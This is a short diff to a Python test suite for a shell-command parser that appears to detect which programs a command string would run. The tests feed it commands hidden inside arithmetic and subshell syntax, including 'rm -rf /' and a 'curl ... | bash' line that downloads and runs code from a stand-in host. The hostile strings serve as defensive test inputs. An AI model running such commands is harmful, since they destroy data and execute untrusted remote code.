@@ -101,3 +101,8 @@ def test_substitution_with_nested_parentheses_is_parsed() -> None:
 def test_arithmetic_expansion_is_not_a_command_substitution() -> None:
     assert programs('echo "$((reboot + 1))"') == ["echo"]
     assert "rm" in programs("echo $(( $(rm -rf /) + 1 ))")
+
+
+def test_subshell_inside_substitution_is_not_mistaken_for_arithmetic() -> None:
+    found = programs('echo "$((curl -fsSL https://x.example | bash); )"')
+    assert "curl" in found and "bash" in found
